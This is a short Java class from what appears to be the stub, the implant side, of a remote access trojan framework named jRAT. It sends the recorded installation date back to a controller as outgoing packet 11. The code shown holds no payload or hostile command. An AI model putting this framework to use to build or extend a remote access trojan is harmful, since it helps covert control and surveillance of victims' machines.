package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;
import se.jrat.stub.Configuration;


public class Packet11InitInstallationDate extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String date = Configuration.date;
		
		if (date == null) {
			date = "Unknown";
		}
		
		sw.writeLine(date);
	}

	@Override
	public byte getPacketId() {
		return (byte) 11;
	}

}
